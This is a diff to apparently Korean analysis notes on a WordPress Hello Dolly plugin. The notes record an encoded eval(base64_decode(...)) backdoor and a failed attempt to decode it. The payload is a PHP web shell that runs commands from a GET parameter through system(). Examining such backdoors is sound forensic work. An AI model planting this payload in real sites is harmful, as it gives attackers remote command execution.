@@ -472,3 +472,26 @@ function dolly_css() {
 add_action( 'admin_head', 'dolly_css' );
 
 ```
+
+# eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=')); -> eval 발견
+
+base64 to text
+
+echo -n "iBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=" | base64 -d
+┌──(root㉿docker-desktop)-[/]
+└─# echo -n "iBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=" | base64 -d
+�Y�
+\��]
+��Uȗ
+M
+�
+�JJH��\�[J MM��Uȗ
+M
+� �
+�JN�Hbase64: invalid input
+
+# 읽을 수 없음
+
+echo -n "iBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=" | tr -d '\n\r ' | base64 -d > unknown.bin
+
+echo -n "iBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=" | tr -d '\n\r ' | base64 -d
